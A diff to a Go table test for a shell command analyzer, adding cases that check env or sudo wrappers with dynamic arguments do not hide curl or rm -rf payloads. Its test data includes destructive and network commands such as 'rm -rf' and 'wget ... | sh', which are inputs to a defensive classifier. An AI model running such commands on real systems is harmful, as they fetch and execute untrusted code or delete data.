@@ -35,6 +35,9 @@ func TestAnalyzeCommand(t *testing.T) {
 		{name: "sudo -n keeps rm payload", script: "sudo -n rm -rf /tmp/x", destructive: true},
 		{name: "sudo -n keeps curl payload", script: "sudo -n curl https://x.test", network: true},
 		{name: "sudo -u consumes its value", script: "sudo -u root vim file", interactive: true},
+		// A dynamic ($x) wrapper arg must not hide the literal payload that follows.
+		{name: "env dynamic flag then curl", script: `env "$opts" curl https://x.test`, network: true},
+		{name: "sudo dynamic flag then rm -rf", script: `sudo "$maybe" rm -rf /tmp/x`, destructive: true},
 
 		{name: "curl", script: "curl https://example.com", network: true},
 		{name: "wget piped to shell", script: "wget -qO- https://x.test | sh", network: true},
